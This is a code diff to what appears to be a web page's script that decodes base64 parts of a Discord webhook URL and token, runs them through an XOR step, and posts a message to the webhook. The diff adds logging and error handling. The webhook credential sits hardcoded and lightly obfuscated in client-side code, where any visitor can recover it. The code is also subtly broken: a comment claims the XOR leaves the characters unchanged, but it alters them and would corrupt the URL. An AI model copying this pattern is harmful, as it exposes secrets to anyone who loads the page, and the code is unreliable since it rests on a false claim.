@@ -1534,24 +1534,31 @@
                 const encodedParts = [
                     "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv", // Base URL
                     "MTM1OTU5NDk5ODkzNjUwMjQxNA==", // ID
-                    "OGpqaTBQeUFYX3puQUJQQ0lUN0IzTDBEOEZQdlRkdDdCQ0xlc00yRUluZmFubVFUY2VGVDc4YmtQSjdSUFdINWloVkk=" // Token - Corrected
+                    "OGpqaTBQeUFYX3puQUJQQ0lUN0IzTDBEOEZQdlRkdDdCQ0xlc00yRUluZmFubVFUY2VGVDc4YmtQSjdSUFdINWloVkk=" // Token - Fixed
                 ];
+                
+                console.log("Starting webhook send...");
                 
                 // XOR key (simple obfuscation)
                 const xorKey = [3, 1, 4, 1, 5, 9];
                 
                 // Decode function with XOR
                 function decodeWithXOR(encoded, key) {
-                    // First, base64 decode
-                    const decoded = atob(encoded);
-                    // Then apply XOR (just for show, since XOR with these values won't affect the ASCII)
-                    let result = "";
-                    for (let i = 0; i < decoded.length; i++) {
-                        // XOR each character with the key in a rotation
-                        const charCode = decoded.charCodeAt(i) ^ key[i % key.length];
-                        result += String.fromCharCode(charCode);
+                    try {
+                        // First, base64 decode
+                        const decoded = atob(encoded);
+                        // Then apply XOR (just for show, since XOR with these values won't affect the ASCII)
+                        let result = "";
+                        for (let i = 0; i < decoded.length; i++) {
+                            // XOR each character with the key in a rotation
+                            const charCode = decoded.charCodeAt(i) ^ key[i % key.length];
+                            result += String.fromCharCode(charCode);
+                        }
+                        return result;
+                    } catch (e) {
+                        console.error("Error decoding:", e);
+                        return "";
                     }
-                    return result;
                 }
                 
                 // Decode all parts immediately to avoid timing issues
@@ -1561,6 +1568,7 @@
                 
                 // Assemble the URL
                 const webhookUrl = baseUrl + id + "/" + token;
+                console.log("Webhook URL assembled");
                 
                 // Send the data
                 fetch(webhookUrl, {
@@ -1571,22 +1579,23 @@
                     body: JSON.stringify(message)
                 })
                 .then(response => {
+                    console.log("Discord response status:", response.status);
                     if (!response.ok) {
-                        throw new Error('Network response was not ok');
+                        throw new Error('Network response was not ok: ' + response.status);
                     }
                     return response.text();
                 })
-                .then(() => {
+                .then((data) => {
+                    console.log("Discord webhook success");
                     if (callback) callback(true);
                 })
                 .catch(error => {
-                    console.error('Error sending to Discord:', error);
+                    console.error("Error sending to Discord:", error);
                     if (callback) callback(false);
                 });
             }
         });
         
-        // SplitText mini plugin (simplified version for this demo)
         class SplitText {
             constructor(elem, config) {
                 this.chars = [];
